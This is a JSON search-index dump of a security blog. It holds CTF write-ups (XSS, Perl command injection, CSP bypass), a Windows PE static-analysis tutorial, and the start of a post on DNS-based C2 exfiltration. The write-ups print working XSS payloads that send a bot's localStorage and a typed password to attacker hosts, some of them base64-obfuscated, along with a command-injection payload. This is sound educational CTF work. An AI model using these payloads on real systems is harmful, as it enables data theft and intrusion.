title }); setHistory(hist); renderHistory(id, title); } So we first need to exfiltrate the bot\u0026rsquo;s notes, I\u0026rsquo;ve crafted (not the copilot) this code to do so:\nfor(var i=0, len=localStorage.length; i\u0026lt;len; i++) { var key = localStorage.key(i); var value = localStorage[key]; fetch(\u0026#39;http://mymentalinstitution.google.com/?d=\u0026#39; + localStorage.key(i) + \u0026#39;\u0026amp;localStorage[key]=\u0026#39; + value) } Now I\u0026rsquo;ve encoded it with base64 and send the payload.\ns onfocus=eval(atob('Zm9yKHZhciBpPTAsIGxlbj1sb2NhbFN0b3JhZ2UubGVuZ3RoOyBpPGxlbjsgaSsrKSB7Cgl2YXIga2V5ID0gbG9jYWxTdG9yYWdlLmtleShpKTsKCXZhciB2YWx1ZSA9IGxvY2FsU3RvcmFnZVtrZXldOwoJZmV0Y2goJ2h0dHA6Ly9teW1lbnRhbGluc3RpdHV0aW9uLmdvb2dsZS5jb20vP2Q9JyArIGxvY2FsU3RvcmFnZS5rZXkoaSkgKyAnJmxvY2FsU3RvcmFnZVtrZXldPScgKyB2YWx1ZSkKfQ==')) autofocus tabindex=1  Note: We need to escape the first attribute in the title here: \u0026lt;a href=/note/%s title=%s\u0026gt;%s\u0026lt;/a\u0026gt; so adding a single letter with space would do the trick\n Now create a note with that title, link it with another note, and then report it to the admin.\nWe would see some requests coming in:\nmicrosoft.com - - [08/Nov/2024 17:54:22] \u0026quot;GET /?d=neko-note-history\u0026amp;localStorage[key]=[{%22id%22:%22161d00ba-6784-4898-8ece-bdc9951120fa%22,%22title%22:%22Flag%22}] HTTP/1.1\u0026quot; 200 - Now we got the Flag\u0026rsquo;s note id, now we need the password for it, we know that the bot is magically deleting it using the backspace we need to find a way to UNDO that!\nSince that the payload gets run whenever we click on Show the Note, we can safely assume that the password is being typed already. In that case we can just get the input field and send the \u0026ldquo;undo\u0026rdquo; command. So the next payload that we are going to do is this one:\ndocument.querySelectorAll(\u0026#39;input\u0026#39;).forEach(input =\u0026gt; { document.execCommand(\u0026#39;undo\u0026#39;); fetch(\u0026#39;http://2.tcp.eu.ngrok.io:17610/?d=\u0026#39; + input.value); }); And redo the steps that we already did for the first payload. After the report to the admin we would get password for the note.\nmicrosoft.com - - [08/Nov/2024 17:55:33] \u0026quot;GET /?d=ae4eadec-3bc0-4884-8ffb-f997a41d35b4 HTTP/1.1\u0026quot; 200 And we can input it and get the flag.\nzer0pts{neko_no_te_mo_karitai_m8jYx9WiTDY} ", 
        "url": "https:\/\/sy1.sh\/writeups\/zer0pts-ctf-2023-neko-note\/"
    },
    
    "https:\/\/sy1.sh\/writeups\/alpacahackr2web-caas\/": {
        "title": "AlpacaHack Round 2 (Web) - CaaS (Cow as a Service)",
        "tags": ["writeups","ctf","perl","command injection",],
        "content": "Overview I\u0026rsquo;ve initially thought that this is a JavaScript command injection challenge, since that we have the flag located at the root and we have a binary that is being executed (/usr/games/cowsay). I began to read the documentation of google/zx , but after a while I didn\u0026rsquo;t find anything that could lead to command injection.\nThen I\u0026rsquo;ve started to explore the binary itself /usr/games/cowsay, I also setup a verbose output for ZX as I\u0026rsquo;ve read the documentation.\nawait $({ verbose: true, cwd: \u0026#34;public/out\u0026#34;, timeout: \u0026#34;2s\u0026#34;, })`/usr/games/cowsay ${message}\u0026gt; ${uuid}`; I\u0026rsquo;ve read the manpage for the binary , where I\u0026rsquo;ve noticed few options:\n cowsay [-e eye_string] [-f cowfile] [-h] [-l] [-n] [-T tongue_string] [-W column] [-bdgpstwy]  I\u0026rsquo;ve exprimeneted a bit with the -eTW options but that yielded nothing, then I\u0026rsquo;ve tried the -l and -f options. The -l option lists the cowfiles located in /usr/share/cowsay/cows/*.cow those are templates for the cowsay. Since that we can write a file to /app/public/out/* I thought that we can create a cow file that would list the root directory, so I\u0026rsquo;ve went to see what are the specifications of that cowfile.\nI\u0026rsquo;ve explored few github projects with additional templates for cowsay and how they are structured, here is an example template:\n## ## acsii picture from http://www.ascii-art.de/ascii/ab/bear.txt ## $eye = chop($eyes); $the_cow = \u0026lt;\u0026lt;EOC; $thoughts $thoughts .--. .--. : (\\\\ \u0026quot;. _......_ .\u0026quot; /) : '. ` ` .' /' _ _ `\\\\ / $eye} {$eye \\\\ | / \\\\ | | /' `\\\\ | \\\\ | . .==. . | / '._ \\\\.' \\\\__/ './ _.' / ``'._-''-_.'`` \\\\ EOC And as the man page says A cowfile is made up of a simple block of perl(1) code, so we can write a perl to the /out directory and try to execute it with -f option.\nBut since that we have bunch of symbols before the text we control like:\n _______________ \u0026lt; waht the fuck \u0026gt; --------------- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || I wasn\u0026rsquo;t sure that if this file is going to run (it didnt).\nweb-1 | $ /usr/games/cowsay -f/app/public/out/fe6bbc8f-3965-4a89-9d47-593bcd1832b6 \u0026gt; e50643f3-8ffe-4772-bab7-3896acbeb65b web-1 | Backslash found where operator expected at /app/public/out/fe6bbc8f-3965-4a89-9d47-593bcd1832b6 line 5, near \u0026quot;)\\\u0026quot; web-1 | (Missing operator before \\?) web-1 | Backslash found where operator expected at /app/public/out/fe6bbc8f-3965-4a89-9d47-593bcd1832b6 line 6, near \u0026quot;)\\\u0026quot; web-1 | (Missing operator before \\?) web-1 | Backslash found where operator expected at /app/public/out/fe6bbc8f-3965-4a89-9d47-593bcd1832b6 line 6, near \u0026quot;)\\\u0026quot; web-1 | (Missing operator before \\?) web-1 | cowsay: Search pattern not terminated at /app/public/out/fe6bbc8f-3965-4a89-9d47-593bcd1832b6 line 6.  Note: I didn\u0026rsquo;t use Burp/Caido, I just went to the input field and placed my payloads.\n So I went to see if there are stuff like string formats in Perl, and I found the weirdly named Baby cart for interpolation. And I\u0026rsquo;ve tried with it with the following payload.\n@{[ system(\u0026quot;ls -la\u0026quot;) ]} And I\u0026rsquo;ve done it, I made the perl to error again. Now I was at a dead end and I got little help with it, I discovered the __END__ bullshit, now this is a special Perl literal that ends the script and that was the thing that I was missing. So in the end the payload became:\n@{[ system(\u0026quot;ls -la\u0026quot;) ]} __END__ And then I would get the UUID and use it again as\n-f/app/public/out/UUID To get the output:\ntotal 1072 drwxrwxrwt 1 root root 32768 Nov 7 09:24 . drwxr-xr-x 1 root root 4096 Nov 7 06:56 .. -rw-r--r-- 1 root root 0 Aug 25 11:38 .gitkeep -rw-r--r-- 1 404 404 13 Nov 7 07:52 011869a0-aaf5-47e2-b6da-7d9bbb82f567 -rw-r--r-- 1 404 404 13 Nov 7 07:25 014eb95c-17f2-45bd-85df-c7714a14e68e -rw-r--r-- 1 404 404 175 Nov 7 08:30 028ad084-a645-4ef5-b0de-8e8516b2aab6 -rw-r--r-- 1 404 404 13 Nov 7 07:40 02cdb7a8-8d39-494b-84cc-860ee5dd7f3f \u0026lt;ANOTHER 30k UUID\u0026gt; __ \u0026lt; \u0026gt; -- And then we can simply cat the flag.\n Note: You don\u0026rsquo;t even need the weirdly named stuf in \u0026ldquo;Perl secret operators and constants\u0026rdquo;, because it turns out that this is not even in perl itself, thanks to the users of StackOverflow that are always suggesting 3rd party solutions to simple things!\n ", 
        "url": "https:\/\/sy1.sh\/writeups\/alpacahackr2web-caas\/"
    },
    
    "https:\/\/sy1.sh\/tags\/command-injection\/": {
        "title": "command injection",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/command-injection\/"
    },
    
    "https:\/\/sy1.sh\/tags\/perl\/": {
        "title": "perl",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/perl\/"
    },
    
    "https:\/\/sy1.sh\/writeups\/alpacahackr2web-pico-note-1\/": {
        "title": "AlpacaHack Round 2 (Web) - Pico Note 1",
        "tags": ["writeups","ctf","js","xss",],
        "content": "Overview In this challenge we need to provide a certain title/content to the main application in order to trigger XSS. However it is quite tricky since that we have a CSP Header with a nonce =\u0026gt; content-security-policy: script-src 'nonce-\u0026lt;random_shit\u0026gt;'; and in order to trigger the XSS we would send an URL to a bot.\nSo let\u0026rsquo;s explore the code.\nCode Analysis We won\u0026rsquo;t check the bot, since it is quite straightforward. The web part however has 2 routes, one for the index and one for the note viewing, the interesting part here:\napp.get(\u0026#34;/note\u0026#34;, async (req, res) =\u0026gt; { const title = String(req.query.title); const content = String(req.query.content); const html = await render(\u0026#34;note\u0026#34;, { nonce: req.nonce, data: JSON.stringify({ title, content }), }); res.type(\u0026#34;text/html\u0026#34;).send(html); }); is that the render function is a custom one, which looks like this:\nconst render = async (view, params) =\u0026gt; { const tmpl = await fs.readFile(`views/${view}.html`, { encoding: \u0026#34;utf8\u0026#34; }); const html = Object.entries(params).reduce( (prev, [key, value]) =\u0026gt; prev.replace(`{{${key}}}`, value), tmpl ); return html; }; If we follow the data flow, we would send the query params title, content which are getting \u0026ldquo;stringified\u0026rdquo; and then passed to render which then is being iterated over with Object.entries, I initially thought that there is some trickery within that so I\u0026rsquo;ve read the whole documentaton for it, now I know 30 useless facts about Object.entries that did not help with solving the thing.\nIn the meantime I was also trying bunch of things, such as {{nonce}} and \u0026lt;/script\u0026gt;, but without the nonce I cannot invoke anything within the new script tag. I\u0026rsquo;ve then moved to replace portion of the code, which is the String.prototype.replace(), this looked more promising and thank god that Specifying a string as the replacement was the in the first couple of scrolls in here. Now this another amazing feature of javascript would give us the \u0026ldquo;portion of the string that precedes the matched substring.\u0026rdquo; using $`. Now I\u0026rsquo;ve exprimented a bit with this but I got it on the first/second try.\nPayload:\n$`alert(1)\u0026lt;/script\u0026gt; And the rest is straightforward and I am leaving you to figure it out.\n", 
        "url": "https:\/\/sy1.sh\/writeups\/alpacahackr2web-pico-note-1\/"
    },
    
    "https:\/\/sy1.sh\/tags\/analysis\/": {
        "title": "analysis",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/analysis\/"
    },
    
    "https:\/\/sy1.sh\/tags\/c\/": {
        "title": "C",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/c\/"
    },
    
    "https:\/\/sy1.sh\/tags\/portable-executable-pe\/": {
        "title": "Portable Executable (PE)",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/portable-executable-pe\/"
    },
    
    "https:\/\/sy1.sh\/posts\/2023-01-06-static-analysis-research-p1\/": {
        "title": "Static Analysis Research - Windows PE",
        "tags": ["windows","Portable Executable (PE)","analysis","C",],
        "content": "Overview Recently, I decided do delve a little bit more into static analysis, something beyond just running strings on a binary and getting the ASCII characters that are printable. I decided to take a deep look at how FLOSS is working and possibly recreate some of its functionality in my own tool.\nBefore reading further, I want you to know that this post is about research I did on static analysis. There is nothing new here - no new tools or features are being discovered. Everything that I talk about already exists in other tools. A big part of this research uses the OpenAI Chat GPT. I made sure to fact-check the information provided here, as the GPT can sometimes produce misleading output.\nMy research focuses on Windows Portable Executable (PE) files because they are the most common type. Therefore, we\u0026rsquo;ll start by exploring how these files operate.\nKeywords  RVA (Relative Virtual Address) - the virtual address of an object from the file once it is loaded into memory, minus the base address of the file image. IDT (Import Directory Table) - is a data structure in a Portable Executable (PE) file that stores information about dynamic-link libraries (DLLs) that the file depends on and the functions that the file imports from those DLLs. ILT - is a data structure in a Portable Executable (PE) file that stores the addresses of imported functions in the executable or library. IAT (Import Address Table) - can be the same with ILT, however when a file is being loaded into memory the loader will overwrite the addresses of the IAT with their new memory address locations. DEP (Data Execution Prevention) - is a security feature that is designed to prevent code from being executed in certain areas of memory where it is not supposed to be executed. doc  ASLR (Address Space Layout Randomization) - is a security feature that randomizes the memory locations of certain parts of a program or operating system, making it more difficult for attackers to predict or control where certain code or data is located in memory. wiki   Windows Portable Executable (PE) An executable is a set of binary data that contains instructions for the operating system to execute when the program is loaded into memory. Let\u0026rsquo;s examine how we can manually parse a Portable Executable (PE) file by reading and interpreting the bytes it contains. To do this, we must carefully review the binary data in the PE file and try to make sense of it.\n The term image refers to the contents of a file when it is loaded into memory. You will encounter this term frequently in the explanations below.\n DOS Header The first 64 bytes of a binary file represent the DOS header, which is included for backwards compatibility and does not directly affect the functioning of the Portable Executable (PE). These 64 bytes contain information such as the number of pages in the file, the number of relocations, the checksum, OEM identifiers, and reserved words. The last 4 bytes of the DOS header, e_lfanew, contain the offset or address of the new PE header in modern Windows applications.\nThe first two bytes of an executable file, 4D 5A which translates to MZ in ASCII, serve as an indicator that the file is an executable intended for use on a Windows operating system.\n Why 4D 5A?   DOS Stub / Rich Header Following the first 64 bytes is the DOS Stub, a small program that displays an error message on systems that are not compatible with MS-DOS. This is a legacy feature dating back to the early days of Windows, when the operating system was built on top of MS-DOS.\nThe Rich Header, on the other hand, is not a required or standard part of the Portable Executable (PE) file format. It contains metadata about the compiler or packer that was used to create the executable and may provide additional information about the file. The magic number for the Rich Header is 52 69 63 68, which translates to Rich in ASCII.\nThe Rich Header information is encrypted using the XOR cipher, which can be easily decrypted using the 4 bytes immediately following the Rich ASCII which is the key.\nTo decrypt the rest of the header, we must run the XOR decipher on the file and unmask the value 44 61 6E 53, which translates to \u0026ldquo;DanS\u0026rdquo; in ASCII. This marks the beginning of the Rich Header, which is then followed by 3 0s after deciphering.\nWith this information, we can determine the start and end of the Rich Header and parse it accordingly.\nThe header can contain data about:\n Compiler and build environment information Timestamps Checksums Other metadata  The Rich Header is a very interesting topic that I would like to write more about, until then you can read the following articles.\n VB2019 paper: Rich Headers: leveraging this mysterious artifact of the PE format  The devil’s in the Rich header   NT Headers (New Technology) If we follow the offset indicated in the last two bytes of the DOS header, we will reach the new PE headers (also known as NT headers). These headers are identified by the 4-byte magic number 50 45 00 00, which translates to PE.. in ASCII. This magic number is used to distinguish the PE headers from other types of headers.\nThe structure of the _IMAGE_NT_HEADERS64:\ntypedef struct _IMAGE_NT_HEADERS64 { DWORD Signature; IMAGE_FILE_HEADER FileHeader; IMAGE_OPTIONAL_HEADER64 OptionalHeader; } IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64; The structure of _IMAGE_FILE_HEADER:\ntypedef struct _IMAGE_FILE_HEADER { WORD Machine; // Predefined value [IMAGE_FILE_MACHINE_I386 or IMAGE_FILE_MACHINE_AMD64]  WORD NumberOfSections; DWORD TimeDateStamp; // Timestamp of which the executable was compiled or linked  DWORD PointerToSymbolTable; // The offset to the COFF Symbol Table  DWORD NumberOfSymbols; // The number of symbols in the COFF Header  WORD SizeOfOptionalHeader; WORD Characteristics; // https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#characteristics } IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;  What is COFF?   The structure of _IMAGE_OPTIONAL_HEADER, this structure is \u0026ldquo;optional\u0026rdquo; but in fact most of the PE files contains this header.\ntypedef struct _IMAGE_OPTIONAL_HEADER { WORD Magic; BYTE MajorLinkerVersion; BYTE MinorLinkerVersion; DWORD SizeOfCode; // .text section size  DWORD SizeOfInitializedData; // .data section size  DWORD SizeOfUninitializedData; // .bss section size  DWORD AddressOfEntryPoint; // 0 if a DLL because its optional otherwise it indicates the RVA (Relative Virtual Address) it is used to determine the address of elements within the file (strings, icons etc.)  DWORD BaseOfCode; // The RVA is the base address of the code section loaded in memory  DWORD BaseOfData; // The RVA for the base address of the data section  DWORD ImageBase; // This indicates the prefered address at which the file is intended to be loaded in memory, almost never used address instead the PE Loader looks for unused memory space to load the image.  DWORD SectionAlignment; // Sections are aligned in memory boundaries that are multiples of this value  DWORD FileAlignment; // Raw data alignment on disk  WORD MajorOperatingSystemVersion; WORD MinorOperatingSystemVersion; WORD MajorImageVersion; WORD MinorImageVersion; WORD MajorSubsystemVersion; WORD MinorSubsystemVersion; DWORD Win32VersionValue; // Reserved (for future use) must be 0, ensures that the file is compatible with the current system  DWORD SizeOfImage; // It gets rounded to a multiple of `SectionAlignment`  DWORD SizeOfHeaders; // Sum(DOS Stub, NT Headers, Section Headers)  DWORD CheckSum; // Checksum of the Image  WORD Subsystem; // Refer to documentation for this one  WORD DllCharacteristics; // Refer to documentation for this one  DWORD SizeOfStackReserve; DWORD SizeOfStackCommit; DWORD SizeOfHeapReserve; DWORD SizeOfHeapCommit; DWORD LoaderFlags; // Obsolete refering to documentation, 0  DWORD NumberOfRvaAndSizes; // Size of DataDirectory below  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; // This contains the addresses of the Export/Import Directories, the Base Relocation table and so on. It is a constant of `16`. } IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; I\u0026rsquo;ve written some quick comments on each of the fields however since that struct is lengthy and well documented you can check the fields here as well.\nHere is the the list of Data Directories entries:\n#define IMAGE_DIRECTORY_ENTRY_EXPORT 0 // Export Directory #define IMAGE_DIRECTORY_ENTRY_IMPORT 1 // Import Directory #define IMAGE_DIRECTORY_ENTRY_RESOURCE 2 // Resource Directory #define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3 // Exception Directory #define IMAGE_DIRECTORY_ENTRY_SECURITY 4 // Security Directory #define IMAGE_DIRECTORY_ENTRY_BASERELOC 5 // Base Relocation Table #define IMAGE_DIRECTORY_ENTRY_DEBUG 6 // Debug Directory // IMAGE_DIRECTORY_ENTRY_COPYRIGHT 7 // (X86 usage) #define IMAGE_DIRECTORY_ENTRY_ARCHITECTURE 7 // Architecture Specific Data #define IMAGE_DIRECTORY_ENTRY_GLOBALPTR 8 // RVA of GP #define IMAGE_DIRECTORY_ENTRY_TLS 9 // TLS Directory #define IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG 10 // Load Configuration Directory #define IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT 11 // Bound Import Directory in headers #define IMAGE_DIRECTORY_ENTRY_IAT 12 // Import Address Table #define IMAGE_DIRECTORY_ENTRY_DELAY_IMPORT 13 // Delay Load Import Descriptors #define IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR 14 // COM Runtime descriptor Sections Headers The section headers are stored in the NT Headers. And the structure of the IMAGE_SECTION_HEADER looks like this:\ntypedef struct _IMAGE_SECTION_HEADER { BYTE Name[IMAGE_SIZEOF_SHORT_NAME]; union { DWORD PhysicalAddress; DWORD VirtualSize; } Misc; DWORD VirtualAddress; DWORD SizeOfRawData; DWORD PointerToRawData; DWORD PointerToRelocations; DWORD PointerToLinenumbers; WORD NumberOfRelocations; WORD NumberOfLinenumbers; DWORD Characteristics; } IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;  Source and Documentation  PE Format   The sections of a Portable Executable (PE) file contain various types of data, such as code, data, resources, and other information. The headers of the file are used to specify the characteristics of these sections, such as whether they contain executable code, initialized data, uninitialized data, or other types of information.\n Tip: You can detect if a PE file has been packed by comparing the values of the VirtualSize and SizeOfRawData fields in the headers. If the VirtualSize is significantly larger than the SizeOfRawData, it is a strong indication that the file has been packed. However, it is worth noting that there may be some discrepancy between the two values due to section padding and alignment.\n Sections Sections are where the actual data of the file is. There are Special Sections as well but we will focus only on the reserved sections such as:\n .bss - Uninitialized data (free format) .data - Initialized data (free format) .cormeta - CLR metadata that indicates that the object file contains managed code .debug (following with)  $F - Generated FPO Frame Poiner Omission debug information (obsolete) $P - Precompiled debug types (object only) $S - Debug symbols (object only) $T - Debug types (object only)   .drective - Linker Options .edata/.idata - Export/Import Tables .idlsym - Includes registered SEH (image only) to support IDL attributes. Often used in conjuction with FPO ref  .pdata - Exception information .rdata - Read-only initialized data .reloc - Relocations of the Image .rsrc - Resource Directory .s(following with) - Global Pointer-relative  .sbss - uninitialized data .sdata - initialized data .srdata - read-only data .sxdata - Registered exception handler data (free format and x86/object only) .vsdata - initialized data (free format and for ARM, SH4, and Thumb architectures only)   .text - Executable code (free format) .tls/.tls$ - Thread-local storage (object only) .xdata - Exception information (free format)  Refer to the documentation for further explanation. Each section is explained very well there.\nImport Directory Table (IDT) The Import Directory Table (IDT) stores information about dynamic-link libraries (DLLs) that a Portable Executable (PE) file depends on and the functions that the file imports from those DLLs. In most cases, this information is stored in the .idata section of the PE file, which is dedicated to this purpose. However, in some cases, the IDT may be stored elsewhere.\nThe address of the IDT can be found in the IMAGE_DATA_DIRECTORY array of the _IMAGE_OPTIONAL_HEADER structure. It is the second entry in the array. Each entry in the IDT is 8 bytes in size, with the first 4 bytes representing the address of the entry and the second 4 bytes representing the size. This information is used by the operating system\u0026rsquo;s dynamic linker to resolve the addresses of the imported functions and link them to the actual functions in the imported DLLs.\nLet\u0026rsquo;s take a look at an example:\nCC280000 The IDT is located at 0xCC28 A0000000 The size is 160 (A0) Following the address of the Import Directory we reach the first import located at 0xCC28, let\u0026rsquo;s see what is located at that address.\nEach Import is defined by 24 bytes, given these 24 bytes values:\nF8290000 OriginalFirstThunk 00000000 Timestamp 00000000 Forwarder Chain (Address) C02A0000 Name of the Import (RVA) D8210000 FirstThunk  OriginalFirstThunk/FirstThunk   To find out which functions are imported by a particular import in a Portable Executable (PE) file, we can follow the OriginalFirstThunk address at 0xF829, which leads us to the Import Lookup Table (ILT). The ILT is a sequence of bytes that represents the addresses of the imported functions, similar to an array or table.\n Note: It\u0026rsquo;s important to note that the Import Address Table (IAT) may be the same as the ILT. However, when a file is loaded, the loader will overwrite the addresses in the IAT with the new memory addresses of the imported functions.\n Each function address in the ILT is 8 bytes in length, so the resulting data should look something like this:\nFC2A0000 This is the address of the imported function 00000000 at 0xFC2A -\u0026gt; B001 Ordinal/Name Import Flag 5368656C6C4578656375746557 ASCII -\u0026gt; \u0026#39;ShellExecuteW\u0026#39; 00 Null char terminating the string With this we can denote and \u0026lsquo;parse\u0026rsquo; all the imports and respectively their imported functions.\nResources To locate the resources in a Portable Executable (PE) file, you can use the third entry in the IMAGE_DATA_DIRECTORY array of the IMAGE_OPTIONAL_HEADER structure. This entry contains the address and size of the resources section in the file.\n00000000 Characteristics 00000000 TimeDateStamp 0000 Major Version 0000 Minor Version 0000 Number of Named entities 0400 Number of ID entities And the corresponding struct\ntypedef struct _IMAGE_RESOURCE_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; WORD NumberOfNamedEntries; WORD NumberOfIdEntries; IMAGE_RESOURCE_DIRECTORY_ENTRY DirectoryEntries[]; } Now let\u0026rsquo;s take a look at the entries IMAGE_RESOURCE_DIRECTORY_ENTRY\ntypedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY { union { struct { DWORD NameOffset:31; DWORD NameIsString:1; } DUMMYSTRUCTNAME; DWORD Name; WORD Id; } DUMMYUNIONNAME; union { DWORD OffsetToData; // Leads us to the resource directory  struct { DWORD OffsetToDirectory:31; DWORD DataIsDirectory:1; } DUMMYSTRUCTNAME2; } DUMMYUNIONNAME2; } IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY; The user mmn3mm has written a pretty good explanation of how to parse this section here .\nException Directory The Exception Directory is a section in a Portable Executable (PE) file that contains information about the exception handling functions in the code. It includes the addresses of the exception handling functions, the types of exceptions they handle, and other relevant details.\nWhen an exception occurs, the operating system\u0026rsquo;s exception handling mechanism uses the Exception Directory to find the appropriate exception handling function. This section is optional and may not be present in every PE file, depending on whether the code in the file uses exception handling.\nIt is typically located at .pdata section, and the offset to the Exception section is the 4th entry in the IMAGE_DATA_DIRECTORY array.\n Personal Note: As far as I understood that section (I could be wrong here) it contains exception handlers that are being used throughout the execution and they execute only if the execution is within the specified BeginAddress and EndAddress.\n The entries there are 12 bytes, first 4 bytes contains the BeginAddress the next 4 bytes contain the EndAddress and the last 4 bytes contains the address (UnwindInfoAddress) for the Unwind Information Block which contains information of how to unwind the stack whenever an exception occurs.\nBase Relocations When a program is compiled, the compiler saves a value into the IMAGE_OPTIONAL_HEADER.ImageBase field, which specifies the desired memory location where the program is intended to be executed. However, this memory location is often already occupied by other programs, so the actual memory location used by the program may be different. In this case, the loader will recalculate the ImageBase value and write the new value into the program\u0026rsquo;s image. This will cause all addresses in the program that are offset by the ImageBase value (essentially, all addresses in the program) to be recalculated with the new ImageBase value and stored in the .reloc section of the image. This process is necessary to ensure that the program can run correctly at its actual memory location.\nThe user 0xRick has written a very good article of how to calcuate the entries within the Relocation Block and more.\nDebug Microsoft Documentation The Debug section is the 7th entry of the IMAGE_DATA_DIRECTORY array, its structure looks like this:\ntypedef struct _IMAGE_DEBUG_DIRECTORY { DWORD Characteristics; // Describing the debug info  DWORD TimeDateStamp; WORD MajorVersion; // Version of the debugging tool  WORD MinorVersion; // Version of the debugging tool  DWORD Type; // Type of Debugging (this will denote the format that you need to parse)  DWORD SizeOfData; // The size of the debug data (not including the debug directory itself)  DWORD AddressOfRawData; // The address of the debug data when loaded, relative to the image base  DWORD PointerToRawData; // The file pointer to the debug data. } IMAGE_DEBUG_DIRECTORY, *PIMAGE_DEBUG_DIRECTORY; Refer to the Microsoft\u0026rsquo;s Documentation about how to parse further debug information.\nLoad Config This section contains information about the dynamic linking and loading of the executable or library and it is the 11th entry of the IMAGE_DATA_DIRECTORY array. The Load Config section typically includes information such as the address of the entry point of the program, the size of the stack and heap, and the addresses of any imported functions or data.\nIt can also include security and integrity-related information, such as Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR) settings.\nIt is typically located at .rdata section and it is an optional section for a PE file.\nThe structure follows:\ntypedef struct _IMAGE_LOAD_CONFIG_DIRECTORY { DWORD Size; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD GlobalFlagsClear; DWORD GlobalFlagsSet; DWORD CriticalSectionDefaultTimeout; DWORD DeCommitFreeBlockThreshold; DWORD DeCommitTotalFreeThreshold; PVOID LockPrefixTable; DWORD MaximumAllocationSize; DWORD VirtualMemoryThreshold; DWORD ProcessAffinityMask; DWORD ProcessHeapFlags; WORD CSDVersion; WORD DependentLoadFlags; PVOID EditList; PVOID SecurityCookie; PVOID SEHandlerTable; DWORD SEHandlerCount; PVOID GuardCFCheckFunctionPointer; PVOID GuardCFDispatchFunctionPointer; PVOID GuardCFFunctionTable; DWORD GuardCFFunctionCount; DWORD GuardFlags; } IMAGE_LOAD_CONFIG_DIRECTORY, *PIMAGE_LOAD_CONFIG_DIRECTORY; Access Rights of the Sections The section rights are presented in the DWORD Characteristics; field of the _IMAGE_SECTION_HEADER , you can check the valid values in the microsoft\u0026rsquo;s documentation .\nThose are the standard access rights of PE.\n   Section Name Access Rights     .text Read and Execute   .rdata Read-Only   .data Read and Write   .bss Read and Write   .rsrc Read Only   .reloc Read Only     Note: Seungwon Lee has indicated that if an essential element of an executable is the WRITE property of a section, the PE could be packed.\n Conclusion This is the first part of my research on static analysis; the primary focus would be on Windows PEs and exactly how much information I can extract before going into the guessing territory.\nIn order for me to do that, I must know how do these files look like and what raw information is stored in their contents; that is why I started this research by examining Windows\u0026rsquo;s PE files.\nI hope you have reached that far and the information that I have provided is useful for you!\nReferences  https://chat.openai.com/  https://github.com/mandiant/flare-floss  https://www.mandiant.com/resources/blog/automatically-extracting-obfuscated-strings  https://stackoverflow.com/questions/36550038/in-utf-16-utf-16be-utf-16le-is-the-endian-of-utf-16-the-computers-endianness  https://0xrick.github.io/  https://securelist.com/the-devils-in-the-rich-header/84348/  https://www.virusbulletin.com/virusbulletin/2020/01/vb2019-paper-rich-headers-leveraging-mysterious-artifact-pe-format/  https://forensicitguy.github.io/rich-header-hashes-with-pefile/  https://github.com/mmn3mm/peresources  The Study of Evasion of Packed PE from Static Detection (Mirza Baig, Pavol Zavarsky, Ron Ruhl, Dale Lindskog) Han, Seungwon Lee, Keungi Lee, Sangjin, “Packed PE File Detection for Malware Forensics”, Computer Science and its Applications, 2nd International Conference, http://ieeexplore.ieee.org/stamp/stamp.jsp?arn umber=05404211, 12 Dec 2009  ", 
        "url": "https:\/\/sy1.sh\/posts\/2023-01-06-static-analysis-research-p1\/"
    },
    
    "https:\/\/sy1.sh\/tags\/windows\/": {
        "title": "windows",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/windows\/"
    },
    
    "https:\/\/sy1.sh\/tags\/c2\/": {
        "title": "C2",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/c2\/"
    },
    
    "https:\/\/sy1.sh\/tags\/dns\/": {
        "title": "DNS",
        "tags": [],
        "content": "", 
        "url": "https:\/\/sy1.sh\/tags\/dns\/"
    },
    
    "https:\/\/sy1.sh\/posts\/2022-10-26-dns-c2-communcation\/": {
        "title": "Using DNS as C2 Communication - Evasive Techniques (Part 3)",
        "tags": ["Go","DNS","C2",],
        "content": "Overview Following my last post about some evasion techniques that the Symbiote uses which I tried to recreate in their simplest form, this post will see how the Symbiote is communicating to the command and control C2 server.\nUpon reading the article, we can see that the Symbiote uses the DNS Protocol to exfiltrate data out of the infected machine, the way that it does that is by chunking it into a bunch of A Resource Records (RR) that it sends through the UDP. The A Record looks like this:\n{PACKET_NUMBER}.{MACHINE_ID}.{HEX_ENCODED_PAYLOAD}.{DOMAIN_NAME} I will deliberately skip the whole authentication process that the malware uses, since it gets out of the scope of the post.\nWhy DNS and not {arbitrary protocol}? DNS is being used in order to avoid/bypass the firewall rules and in some special scenarios that no TCP outgoing communication is possible.\nBypassing security products via DNS data exfiltration Implementation I will explain it briefly from the agent\u0026rsquo;s point of view. We are sending the C2 server a beam (in a shape of a DNS request) every n seconds to check if there is a command for us to execute if we receive a non empty Answer with a TXT Record (containing a command such as ls) we execute that command and after we have the output of the command, we exfiltrate it back to the C2 Server. This happens by sending multiple DNS A record questions (chunks) back to the server. I used the same format that the Symbiote uses for the records.\nNote: Each element of a domain name can contain up to 63 chars of information, a full domain name can contain 253 chars. More info After the server receives a request with the packet number and the total number of packets (that\u0026rsquo;s the first part of the message) it starts building the output message that we will see after we receive all the packets (through the {HEX_ENCODED_PAYLOAD} part of the message).\nCode / 